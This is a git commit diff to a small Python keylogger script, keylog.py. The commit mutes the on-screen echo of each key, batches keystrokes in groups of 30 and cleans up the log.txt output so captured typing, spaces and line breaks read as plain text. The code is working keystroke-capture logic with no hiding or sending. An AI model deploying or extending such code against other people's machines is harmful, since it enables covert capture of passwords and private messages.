e03af01911ee5eb59b263d9fafc2097f2719417b
Abdul Salam Khan <kabdulsalam6@gmail.com>
2019-04-24 05:04:31 -0700

    fixed the log.txt file format. Removed the single quote for every character

--- keylog.py
+++ keylog.py
@@ -9,20 +9,33 @@ def on_press(key):
 	
 	keys.append(key)
 	count += 1
-	print('key {0} is pressed'.format(key))
+	# print('key {0} is pressed'.format(key))
 
-	if count>=20:
+	if count>=30:
 		count = 0
+		# write into the log.txt the keys list
 		write_file(keys)
 		keys = []
 
 def write_file(keys):
+	# open the text file and append the keys
 	with open("log.txt", "a") as f:
 		for key in keys:
-			f.write(str(key))
-			
+			k = str(key).replace("'","")
+			if k.find("space") > 0:
+			# if space is pressed then ' ' is appended without quotes
+				f.write(' ')
+			# if enter is pressed then newline line is append
+			elif k.find("enter") > 0:
+				f.write('\n')
+			# else the presse key is appended
+			elif k.find("Key") == -1:
+				f.write(k)
+
+
 def on_release(key):
 	if key == Key.esc:
+		# open("log.txt", "w").close()
         # Stop listener
 		return False
 
